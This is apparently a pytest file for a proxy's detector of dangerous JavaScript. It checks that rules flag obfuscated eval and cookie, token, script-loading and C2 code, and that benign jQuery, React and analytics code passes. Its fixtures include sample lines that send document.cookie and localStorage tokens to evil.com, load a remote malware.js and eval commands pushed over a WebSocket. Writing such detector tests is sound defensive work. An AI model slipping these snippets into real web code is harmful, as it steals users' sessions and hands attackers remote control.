"""Tests for JavaScript-specific dangerous patterns in rules.yml."""
import yaml
from pathlib import Path

import pytest

from proxy.content_inspector import check_dangerous_patterns

RULES_PATH = Path(__file__).resolve().parent.parent / "rules" / "rules.yml"


@pytest.fixture(scope="module")
def js_patterns():
    with open(RULES_PATH) as f:
        rules = yaml.safe_load(f)
    return [p for p in rules["dangerous_patterns"] if p["name"].startswith("js_")]


def _match(patterns, code: str) -> str | None:
    return check_dangerous_patterns(code.encode(), patterns)


class TestJsObfuscation:
    def test_eval_atob(self, js_patterns):
        assert _match(js_patterns, "eval(atob('ZG9jdW1lbnQ='))") == "js_eval_atob"

    def test_eval_atob_with_spaces(self, js_patterns):
        assert _match(js_patterns, "eval( atob( 'abc' ) )") == "js_eval_atob"

    def test_eval_fromcharcode(self, js_patterns):
        assert _match(js_patterns, "eval(String.fromCharCode(72,101))") == "js_eval_fromcharcode"

    def test_function_constructor_concat(self, js_patterns):
        assert _match(js_patterns, "new Function('re' + 'turn this')()") == "js_function_constructor"

    def test_document_write_unescape(self, js_patterns):
        assert _match(js_patterns, "document.write(unescape('%3Cscript'))") == "js_document_write_unescape"

    def test_normal_eval_not_matched(self, js_patterns):
        """Plain eval with a string literal should not match obfuscation patterns."""
        assert _match(js_patterns, "eval('1+1')") is None

    def test_normal_function_constructor_not_matched(self, js_patterns):
        """Function constructor without concatenation should not match."""
        assert _match(js_patterns, "new Function('return 1')()") is None


class TestJsCookieExfil:
    def test_cookie_fetch(self, js_patterns):
        code = "fetch('https://evil.com/?c=' + document.cookie)"
        assert _match(js_patterns, code) == "js_cookie_exfil_fetch"

    def test_cookie_xhr(self, js_patterns):
        code = "var x = new XMLHttpRequest(); x.open('GET','https://evil.com/?c=' + document.cookie)"
        assert _match(js_patterns, code) == "js_cookie_exfil_xhr"

    def test_cookie_img(self, js_patterns):
        code = "new Image().src = 'https://evil.com/?c=' + document.cookie"
        assert _match(js_patterns, code) == "js_cookie_exfil_img"

    def test_storage_fetch(self, js_patterns):
        code = "fetch('https://evil.com', {body: localStorage.getItem('token')})"
        assert _match(js_patterns, code) == "js_storage_exfil"

    def test_normal_cookie_read_not_matched(self, js_patterns):
        """Just reading document.cookie without exfiltration should not match."""
        assert _match(js_patterns, "var c = document.cookie; console.log(c);") is None


class TestJsDynamicScript:
    def test_create_script_element(self, js_patterns):
        code = "var s = document.createElement('script'); s.src = 'https://evil.com/malware.js';"
        assert _match(js_patterns, code) == "js_dynamic_script_src"

    def test_createElement_div_not_matched(self, js_patterns):
        """createElement for non-script elements should not match."""
        assert _match(js_patterns, "document.createElement('div')") is None


class TestJsC2:
    def test_websocket_eval(self, js_patterns):
        code = "var ws = new WebSocket('wss://c2.evil.com'); ws.onmessage = function(e) { eval(e.data); };"
        assert _match(js_patterns, code) == "js_websocket_eval"

    def test_beacon_interval(self, js_patterns):
        code = "setInterval(function() { fetch('https://c2.evil.com/beacon'); }, 5000);"
        assert _match(js_patterns, code) == "js_beacon_interval"

    def test_normal_websocket_not_matched(self, js_patterns):
        """WebSocket without eval should not match."""
        assert _match(js_patterns, "var ws = new WebSocket('wss://api.example.com'); ws.onmessage = function(e) { console.log(e.data); };") is None

    def test_normal_setinterval_not_matched(self, js_patterns):
        """setInterval without fetch to external URL should not match."""
        assert _match(js_patterns, "setInterval(function() { updateClock(); }, 1000);") is None


class TestJsSafeCode:
    """Ensure common legitimate JS patterns do not trigger false positives."""

    def test_jquery_no_match(self, js_patterns):
        code = "$(document).ready(function() { $.get('/api/data', function(d) { console.log(d); }); });"
        assert _match(js_patterns, code) is None

    def test_react_no_match(self, js_patterns):
        code = "const App = () => { const [state, setState] = useState(null); useEffect(() => { fetch('/api').then(r => r.json()).then(setState); }, []); return null; };"
        assert _match(js_patterns, code) is None

    def test_analytics_no_match(self, js_patterns):
        code = "gtag('config', 'GA_MEASUREMENT_ID'); window.dataLayer = window.dataLayer || [];"
        assert _match(js_patterns, code) is None
